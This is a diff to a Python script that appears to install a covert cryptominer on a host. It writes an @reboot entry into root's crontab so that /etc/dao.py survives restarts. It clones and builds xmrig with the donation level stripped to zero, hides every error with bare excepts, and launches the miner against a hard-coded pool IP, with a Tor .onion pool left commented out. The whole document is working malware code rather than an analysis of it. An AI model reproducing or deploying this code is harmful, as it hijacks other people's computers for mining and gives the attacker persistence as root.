@@ -25,11 +25,18 @@ try:
 except:
     pass
 try:
+    path = '/var/spool/cron/crontabs/root'
+    data = '@reboot screen -dm python /etc/dao.py'
+    os.system('echo %s >> %s' %(data, path))
+    os.system('chmod 600 %s' %path)
+except:
+    pass
+try:
 
     if not os.path.isfile('/root/%s/build/xmrig' % link_folder):
         os.chdir('/root')
         os.system('rm -rf %s' %link_folder)
-        os.system('torify git clone %s' %link_github)
+        os.system('git clone %s' %link_github)
         os.chdir(link_folder)
         os.system('sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = 0/g" src/donate.h')
         os.system('mkdir build && cd build && cmake .. && make')
@@ -47,17 +54,9 @@ try:
             time.sleep(2)
         except:
             pass
-    try:
-        path = '/var/spool/cron/crontabs/root'
-        data = '@reboot screen -dm python /etc/dao.py'
-        os.system('echo %s >> %s' %(data, path))
-        os.system('chmod 600 %s' %path)
-    except:
-        pass
+
 except:
     pass
 
-os.system('tor &')
-time.sleep(60)
 #os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
 os.system (program + ' -o stratum+tcp://66.42.53.57:442 --tls -socks5=9050 -t ' + str(cores))
